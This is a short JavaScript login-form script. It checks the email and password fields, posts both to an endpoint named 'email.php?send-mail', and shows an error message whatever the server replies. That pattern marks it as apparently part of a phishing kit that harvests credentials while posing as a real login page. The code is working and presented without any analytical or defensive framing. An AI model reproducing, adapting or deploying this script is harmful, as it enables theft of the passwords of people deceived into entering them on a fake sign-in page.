var btnLogin = document.getElementById("login");

var email = document.getElementById("email");
var password = document.getElementById("password");
var error = document.querySelector("#error");

btnLogin.addEventListener('click', function(e){
	console.log('g');
	e.preventDefault();
	if(email.value === ""){
		error.textContent = "You must specify a username to log in.";
		email.focus();
		return false;
	}else if(password.value === ""){
		error.textContent = "You must specify a password to log in.";
		password.focus();
		return false;
	} else {
		error.textContent = "Authenticating...";
		error.className = error.className.replace(/\bhide\b/g, "show");

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
	      	console.log(xmlhttp.responseText);
	      	var res = xmlhttp.responseText.replace(/\s+/g, "");
	      	if(xmlhttp.responseText === 'true'){
	      		error.textContent = "Something went wrong";
	      	}else {
	      		error.textContent = "Authentication Failed";
	      	}
	      }
	    }

    	var formdata = new FormData();

    	formdata.append("email", email.value);
    	formdata.append("password", password.value);

	    var url = 'email.php?send-mail';
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return true;
	}
})